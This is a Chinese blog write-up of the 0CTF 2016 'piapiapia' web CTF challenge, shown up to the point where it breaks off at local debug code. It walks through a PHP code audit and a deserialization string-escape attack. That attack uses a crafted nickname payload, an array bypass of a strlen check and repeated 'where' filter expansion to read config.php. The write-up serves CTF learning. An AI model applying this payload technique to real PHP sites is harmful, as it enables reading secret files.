---
layout: post
title: "0CTF-2016-piapiapia-1"
date: 2025-03-16 11:33:57 +0800
description: "手机号必须是11位数字。邮箱地址必须符合简单的格式规则（本地部分@域名部分.顶级域名部分）。昵称只能包含字母、数字或下划线，且长度不超过10个字符。如果任何一项验证失败，程序会立即终止并输出相应的错误信息。功能：获取通过HTTP POST上传的文件信息。逻辑是一个关联数组，包含了用户上传文件的相关信息。'photo'是表单中文件输入字段的名称，例如。$file变量将存储文件的上传信息，包括临时文件名、原始文件名、文件大小、文件类型和错误信息等。功能。"
keywords: "0CTF 2016 piapiapia 1"
categories: ['未分类']
tags: ['经验分享']
artid: "146292507"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146292507
    alt: "0CTF-2016-piapiapia-1"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146292507
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146292507
cover: https://bing.ee123.net/img/rand?artid=146292507
image: https://bing.ee123.net/img/rand?artid=146292507
img: https://bing.ee123.net/img/rand?artid=146292507
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     0CTF 2016 piapiapia 1
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-atom-one-dark" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <p>
     #源码泄露 #代码审计 #反序列化字符逃逸 #strlen长度过滤数组绕过
     <br/>
     www.zip 得到源码
    </p>
    <p>
     <img alt="请添加图片描述" src="https://i-blog.csdnimg.cn/direct/65e943c1eec04fec9e1b39806da02a3e.png"/>
    </p>
    <p>
     看到这里有flag ，猜测服务端docker的主机里，$flag变量应该存的就是我们要的flag。
    </p>
    <p>
     于是，我们的目的就是读取·config.php
    </p>
    <h3>
     <a id="_12">
     </a>
     利用思路
    </h3>
    <p>
     这里存在 任意文件读取漏洞
    </p>
    <pre><code class="prism language-php">        <span class="token variable">$profile</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$phone</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token variable">$email</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token variable">$photo</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <p>
     利用file_get_contents 读取文件
    </p>
    <p>
     控制反序列化后的 photo
    </p>
    <p>
     后面发现 要点不是控制photo 利用反序列化把他挤下去
    </p>
    <h2>
     <a id="_34">
     </a>
     追踪文件读取
    </h2>
    <p>
     大纲：
    </p>
    <p>
     profile的值为 实例化的一个user类的对象，这个对象调用show_profile方法 处理username
     <br/>
     其中，调用了一个父类的方法 filter 处理username ，然后在show_profile里进行sql查询，返回查询结果，这个结果最终返回到 profile.php 读取photo 部分并输出
    </p>
    <p>
     可见，我们需要利用photo部分。
     <br/>
     怎么用？我们就要追溯 update.php了 在那里，我们看到photo 的值是一个路径 ，在哪里 利用user的update_profile 方法
    </p>
    <p>
     所以，我们在update.php下进行注入（数据操作）
    </p>
    <p>
     追踪 update_profile 也 用 parent::filter 方法进行replace 然后调用父类的 parent::update 方法进行数据库交互 （数据更新）
    </p>
    <p>
     详解： 下面是上面大纲的截取的部分详解
    </p>
    <pre><code class="prism language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">update_profile</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$new_profile</span> <span class="token operator">=</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$new_profile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  

        <span class="token variable">$where</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> <span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">table</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'profile'</span><span class="token punctuation">,</span> <span class="token variable">$new_profile</span><span class="token punctuation">,</span> <span class="token variable">$where</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
</code></pre>
    <p>
     利用user类的update_profile 进行filter的更新
    </p>
    <p>
     <img alt="请添加图片描述" src="https://i-blog.csdnimg.cn/direct/268e76ea2b494d91bc0fdb22b5d5a114.png"/>
    </p>
    <h3>
     <a id="updatephp_____update_profile__72">
     </a>
     看到在update.php 路径下 存在update对 profile 的修改
    </h3>
    <h4>
     <a id="_74">
     </a>
     存在过滤
    </h4>
    <p>
     以下是对这段代码的逐句解释：
    </p>
    <pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\d{11}$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid phone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <ol>
     <li>
      <strong>
       功能
      </strong>
      ：验证用户提交的手机号是否符合11位数字的格式。
     </li>
     <li>
      <strong>
       逻辑
      </strong>
      ：
      <ul>
       <li>
        <code>
         preg_match('/^\d{11}$/', $_POST['phone'])
        </code>
        ：使用正则表达式匹配
        <code>
         $_POST['phone']
        </code>
        的值。
        <ul>
         <li>
          <code>
           ^\d{11}$
          </code>
          ：表示从字符串开头到结尾必须是恰好11位数字。
         </li>
         <li>
          <code>
           \d
          </code>
          ：匹配任意数字字符（0-9）。
         </li>
         <li>
          <code>
           {11}
          </code>
          ：表示前面的数字字符必须出现恰好11次。
         </li>
        </ul>
       </li>
       <li>
        如果匹配失败（即手机号不符合11位数字的格式），
        <code>
         preg_match
        </code>
        返回
        <code>
         false
        </code>
        ，
        <code>
         !preg_match
        </code>
        的结果为
        <code>
         true
        </code>
        ，执行
        <code>
         die('Invalid phone')
        </code>
        ，程序终止并输出
        <code>
         Invalid phone
        </code>
        。
       </li>
      </ul>
     </li>
    </ol>
    <pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid email'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <ol>
     <li>
      <strong>
       功能
      </strong>
      ：验证用户提交的邮箱地址是否符合简单的邮箱格式规则。
     </li>
     <li>
      <strong>
       逻辑
      </strong>
      ：
      <ul>
       <li>
        <code>
         preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email'])
        </code>
        ：使用正则表达式匹配
        <code>
         $_POST['email']
        </code>
        的值。
        <ul>
         <li>
          <code>
           ^[_a-zA-Z0-9]{1,10}
          </code>
          ：邮箱的本地部分（@前面的部分），允许1到10个字符，字符可以是字母（大小写）、数字或下划线。
         </li>
         <li>
          <code>
           @
          </code>
          ：邮箱地址中的
          <code>
           @
          </code>
          符号。
         </li>
         <li>
          <code>
           [_a-zA-Z0-9]{1,10}
          </code>
          ：邮箱的域名部分（@后面到
          <code>
           .
          </code>
          的部分），允许1到10个字符，字符可以是字母（大小写）、数字或下划线。
         </li>
         <li>
          <code>
           \.
          </code>
          ：邮箱地址中的
          <code>
           .
          </code>
          符号。
         </li>
         <li>
          <code>
           [_a-zA-Z0-9]{1,10}$
          </code>
          ：邮箱的顶级域名部分（
          <code>
           .
          </code>
          后面的部分），允许1到10个字符，字符可以是字母（大小写）、数字或下划线。
         </li>
        </ul>
       </li>
       <li>
        如果匹配失败（即邮箱格式不符合规则），
        <code>
         preg_match
        </code>
        返回
        <code>
         false
        </code>
        ，
        <code>
         !preg_match
        </code>
        的结果为
        <code>
         true
        </code>
        ，执行
        <code>
         die('Invalid email')
        </code>
        ，程序终止并输出
        <code>
         Invalid email
        </code>
        。
       </li>
      </ul>
     </li>
    </ol>
    <pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">10</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <ol>
     <li>
      <strong>
       功能
      </strong>
      ：验证用户提交的昵称是否只包含字母、数字或下划线，并且长度不超过10个字符。
     </li>
     <li>
      <strong>
       逻辑
      </strong>
      ：
      <ul>
       <li>
        <code>
         preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname'])
        </code>
        ：使用正则表达式检查
        <code>
         $_POST['nickname']
        </code>
        中是否存在非字母、非数字、非下划线的字符。
        <ul>
         <li>
          <code>
           [^a-zA-Z0-9_]
          </code>
          ：匹配任何不在
          <code>
           a-z
          </code>
          、
          <code>
           A-Z
          </code>
          、
          <code>
           0-9
          </code>
          或
          <code>
           _
          </code>
          范围内的字符。
         </li>
        </ul>
       </li>
       <li>
        <code>
         strlen($_POST['nickname']) &gt; 10
        </code>
        ：检查昵称的长度是否超过10个字符。
       </li>
       <li>
        如果
        <code>
         preg_match
        </code>
        匹配到非法字符（返回
        <code>
         true
        </code>
        ），或者昵称长度超过10个字符，整个条件表达式的结果为
        <code>
         true
        </code>
        ，执行
        <code>
         die('Invalid nickname')
        </code>
        ，程序终止并输出
        <code>
         Invalid nickname
        </code>
        。
       </li>
      </ul>
     </li>
    </ol>
    <h5>
     <a id="_117">
     </a>
     总结
    </h5>
    <p>
     这段代码的作用是对用户提交的表单数据进行简单的格式验证：
    </p>
    <ol>
     <li>
      手机号必须是11位数字。
     </li>
     <li>
      邮箱地址必须符合简单的格式规则（本地部分@域名部分.顶级域名部分）。
     </li>
     <li>
      昵称只能包含字母、数字或下划线，且长度不超过10个字符。
     </li>
    </ol>
    <p>
     如果任何一项验证失败，程序会立即终止并输出相应的错误信息。
    </p>
    <pre><code class="prism language-php">        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">5</span> <span class="token keyword">or</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">1000000</span><span class="token punctuation">)</span>

            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Photo size error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <p>
     以下是对这段代码的逐句解释：
    </p>
    <pre><code class="prism language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre>
    <ol>
     <li>
      <strong>
       功能
      </strong>
      ：获取通过HTTP POST上传的文件信息。
     </li>
     <li>
      <strong>
       逻辑
      </strong>
      ：
      <ul>
       <li>
        <code>
         $_FILES['photo']
        </code>
        是一个关联数组，包含了用户上传文件的相关信息。
       </li>
       <li>
        <code>
         'photo'
        </code>
        是表单中文件输入字段的名称，例如
        <code>
         &lt;input type="file" name="photo"&gt;
        </code>
        。
       </li>
       <li>
        <code>
         $file
        </code>
        变量将存储文件的上传信息，包括临时文件名、原始文件名、文件大小、文件类型和错误信息等。
       </li>
      </ul>
     </li>
    </ol>
    <pre><code class="prism language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">5</span> <span class="token keyword">or</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">1000000</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Photo size error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <ol>
     <li>
      <strong>
       功能
      </strong>
      ：验证上传文件的大小是否在允许的范围内（5字节到1MB）。
     </li>
     <li>
      <strong>
       逻辑
      </strong>
      ：
      <ul>
       <li>
        <code>
         $file['size']
        </code>
        是上传文件的大小，以字节为单位。
       </li>
       <li>
        条件
        <code>
         $file['size'] &lt; 5 or $file['size'] &gt; 1000000
        </code>
        检查文件大小是否小于5字节或大于1MB。
       </li>
       <li>
        如果条件成立（即文件大小不在允许范围内），执行
        <code>
         die('Photo size error')
        </code>
        ，程序终止并输出
        <code>
         Photo size error
        </code>
        。
       </li>
      </ul>
     </li>
    </ol>
    <h5>
     <a id="_155">
     </a>
     总结
    </h5>
    <p>
     这段代码的作用是验证用户上传的文件（照片）的大小是否符合要求：
    </p>
    <ul>
     <li>
      文件大小必须在5字节到1MB之间。
     </li>
     <li>
      如果文件大小不符合要求，程序会立即终止并输出错误信息
      <code>
       Photo size error
      </code>
      。
     </li>
    </ul>
    <h4>
     <a id="_160">
     </a>
     注意事项
    </h4>
    <ol>
     <li>
      <p>
       <strong>
        文件上传的安全性
       </strong>
       ：
      </p>
      <ul>
       <li>
        除了检查文件大小，还应该检查文件类型，确保只允许上传特定的文件类型（如图片）。
       </li>
       <li>
        可以使用
        <code>
         $file['type']
        </code>
        或者更可靠的方法（如检查文件扩展名或文件头）来验证文件类型。
       </li>
      </ul>
     </li>
     <li>
      <p>
       <strong>
        错误处理
       </strong>
       ：
      </p>
      <ul>
       <li>
        使用
        <code>
         die()
        </code>
        会直接终止脚本运行，可能不太适合用户友好的界面。可以考虑使用更友好的错误提示方式，例如将错误信息存储在变量中并重新渲染表单。
       </li>
      </ul>
     </li>
     <li>
      <p>
       <strong>
        文件上传的其他检查
       </strong>
       ：
      </p>
      <ul>
       <li>
        检查
        <code>
         $_FILES['photo']['error']
        </code>
        是否为
        <code>
         UPLOAD_ERR_OK
        </code>
        ，以确保文件上传过程中没有发生错误。
       </li>
       <li>
        检查文件是否真的被上传（即是否是一个临时文件）。
       </li>
      </ul>
     </li>
    </ol>
    <p>
     示例代码可以扩展为：
    </p>
    <pre><code class="prism language-php"><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token comment">// 检查文件上传是否有错误</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant">UPLOAD_ERR_OK</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'File upload error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 检查文件大小</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">5</span> <span class="token operator">||</span> <span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'size'</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> <span class="token number">1000000</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Photo size error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 检查文件类型</span>
<span class="token variable">$allowedTypes</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'image/jpeg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'image/png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'image/gif'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allowedTypes</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid file type'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">// 其他处理逻辑...</span>
</code></pre>
    <p>
     这样可以更全面地确保文件上传的安全性和正确性。
    </p>
    <h3>
     <a id="replace_197">
     </a>
     replace
    </h3>
    <p>
     追踪 update_profile 用 parent::filter 方法
    </p>
    <pre><code class="prism language-php">
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

        <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\''</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\\\\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$escape</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$escape</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">;</span>

        <span class="token variable">$string</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$escape</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'_'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  

        <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'insert'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'update'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'delete'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'where'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token variable">$safe</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$safe</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/i'</span><span class="token punctuation">;</span>

        <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$safe</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>

        <span class="token keyword">return</span> __class__<span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
</code></pre>
    <p>
     <img alt="请添加图片描述" src="https://i-blog.csdnimg.cn/direct/d34c0ba788514f4cb9be941546db3016.png"/>
    </p>
    <ul>
     <li>
      ! 到这里幡然醒悟，我们利用这里对 profile 的replace 进行反序列化
     </li>
    </ul>
    <p>
     看到可利用where被替换，将有一个多出来
    </p>
    <ul>
     <li>
      $ 这里肯定不能直接对photo进行修改，那就考虑nickname入口，先试着构造下
     </li>
    </ul>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'phone'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'12345678901'</span><span class="token punctuation">;</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'for@example.com'</span><span class="token punctuation">;</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'";s:5:"photo";s:10:"config.php";}'</span><span class="token punctuation">;</span>
<span class="token variable">$profile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'photo'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'upload/43892f297aksddn84743894a0eiek69f'</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$profile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
    <pre><code>"a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:15:"for@example.com";s:8:"nickname";s:33:"";s:5:"photo";s:10:"config.php";}";s:5:"photo";s:39:"upload/43892f297aksddn84743894a0eiek69f";}"
</code></pre>
    <h4>
     <a id="_256">
     </a>
     数组序列化与类序列化的区别
    </h4>
    <ol>
     <li>
      <p>
       <strong>
        序列化后的格式
       </strong>
      </p>
      <ul>
       <li>
        <p>
         普通数组的序列化字符串以
         <code>
          a
         </code>
         开头，表示数组（
         <code>
          array
         </code>
         ）。
        </p>
       </li>
       <li>
        <p>
         类的序列化字符串以
         <code>
          O
         </code>
         开头，表示对象（
         <code>
          object
         </code>
         ），后面跟着类名和类的属性。
        </p>
       </li>
      </ul>
     </li>
     <li>
      <p>
       <strong>
        反序列化后的结果
       </strong>
      </p>
      <ul>
       <li>
        <p>
         普通数组反序列化后是一个数组。
        </p>
       </li>
       <li>
        <p>
         类反序列化后是一个对象，且必须在当前脚本中定义了该类，否则会抛出错误。
        </p>
       </li>
      </ul>
     </li>
     <li>
      <p>
       <strong>
        类的特殊行为
       </strong>
      </p>
      <ul>
       <li>
        <p>
         类可以定义魔术方法
         <code>
          __sleep()
         </code>
         和
         <code>
          __wakeup()
         </code>
         来控制序列化和反序列化的过程。
        </p>
       </li>
       <li>
        <p>
         <code>
          __sleep()
         </code>
         在序列化之前被调用，可以返回一个包含对象中应被序列化的变量名称的数组。
        </p>
       </li>
       <li>
        <p>
         <code>
          __wakeup()
         </code>
         在反序列化之后被调用，可以用于重新初始化对象的属性。
        </p>
       </li>
      </ul>
     </li>
    </ol>
    <p>
     <img alt="请添加图片描述" src="https://i-blog.csdnimg.cn/direct/991bebeb546e450b9e165a28506839af.png"/>
    </p>
    <p>
     超全局变量在这里实例化
    </p>
    <hr/>
    <p>
     我们继续：
     <br/>
     我们要把上面那部分nickname逃逸出来
    </p>
    <p>
     第一次过滤：
     <br/>
     在uopdate里，存在对nickname的过滤
    </p>
    <pre><code class="prism language-php">        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^a-zA-Z0-9_]/'</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">10</span><span class="token punctuation">)</span>

            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Invalid nickname'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
    <p>
     正则表达式
     <code>
      /[^a-zA-Z0-9_]/
     </code>
     用于匹配任何不在指定字符集中的字符。下面是对该正则表达式各部分的详细解释：
     <br/>
     [[正则匹配原则]]
     <br/>
     <strong>
      正则表达式分解
     </strong>
    </p>
    <ol>
     <li>
      <p>
       <strong>
        <code>
         /
        </code>
       </strong>
       ：正则表达式的开始和结束分界符。
      </p>
     </li>
     <li>
      <p>
       <strong>
        <code>
         [^...]
        </code>
       </strong>
       ：表示一个字符集的取反，即匹配不在方括号内的任何字符。
      </p>
     </li>
     <li>
      <p>
       <strong>
        <code>
         a-z
        </code>
       </strong>
       ：表示所有小写字母（从
       <code>
        a
       </code>
       到
       <code>
        z
       </code>
       ）。
      </p>
     </li>
     <li>
      <p>
       <strong>
        <code>
         A-Z
        </code>
       </strong>
       ：表示所有大写字母（从
       <code>
        A
       </code>
       到
       <code>
        Z
       </code>
       ）。
      </p>
     </li>
     <li>
      <p>
       <strong>
        <code>
         0-9
        </code>
       </strong>
       ：表示所有数字（从
       <code>
        0
       </code>
       到
       <code>
        9
       </code>
       ）。
      </p>
     </li>
     <li>
      <p>
       <strong>
        <code>
         _
        </code>
       </strong>
       ：表示下划线字符。
      </p>
     </li>
    </ol>
    <p>
     <strong>
      匹配的字符
     </strong>
    </p>
    <p>
     该正则表达式将匹配任何不在以下集合中的字符：
    </p>
    <ul>
     <li>
      <p>
       小写字母（
       <code>
        a
       </code>
       到
       <code>
        z
       </code>
       ）
      </p>
     </li>
     <li>
      <p>
       大写字母（
       <code>
        A
       </code>
       到
       <code>
        Z
       </code>
       ）
      </p>
     </li>
     <li>
      <p>
       数字（
       <code>
        0
       </code>
       到
       <code>
        9
       </code>
       ）
      </p>
     </li>
     <li>
      <p>
       下划线（
       <code>
        _
       </code>
       ）
      </p>
     </li>
    </ul>
    <p>
     #strlen长度过滤数组绕过 我们用数组绕过
    </p>
    <p>
     第二次过滤：
     <br/>
     即上面的replace
    </p>
    <p>
     本地调试：
     <br/>
     我们要读config.php
    </p>
    <pre><code>"a:4:{s:5:"phone";s:11:"12345678901";s:5:"email";s:15:"for@example.com";s:8:"nickname";s:33:"";s:5:"photo";s:10:"config.php";}";s:5:"photo";s:11:"/config.php";}"
</code></pre>
    <p>
     ";s:5:“photo”;s:10:“config.php”;} 有33跟字符，所以我们需要33个·where
    </p>
    <p>
     本地调试代码：
    </p>
    <pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
